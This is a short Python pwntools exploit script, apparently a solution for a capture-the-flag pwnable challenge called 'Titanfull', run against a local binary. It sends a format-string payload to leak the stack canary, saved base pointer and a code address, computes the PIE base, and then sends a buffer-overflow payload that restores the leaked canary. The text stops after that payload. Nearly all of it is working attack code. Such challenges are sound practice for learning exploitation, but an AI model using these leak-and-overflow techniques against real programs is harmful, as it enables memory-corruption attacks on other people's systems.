from pwn import *

rem = process("./Pwnable/Titanfull/problem/titanfull")
# gdb.attach(rem)

elf = ELF("./Pwnable/Titanfull/problem/titanfull")

main_offset = elf.symbols['main']
bss_addr = elf.bss()

rem.sendlineafter(b"> ", b"%17$p\n%18$p\n%19$p")
rem.recvuntil(b"0x")
canary = int(rem.recvn(16), 16)
print(hex(canary))
rbp = int(rem.recvn(12), 16)
rem.recvuntil(b"0x")
main_addr = int(rem.recvn(12), 16) - 28
pie_base = main_addr - main_offset

rem.sendlineafter(b"> ", b"7274")
payload = b"A" * 0x18 + p64(canary) + b"A" * 8
rem.sendlineafter(b": ", payload)

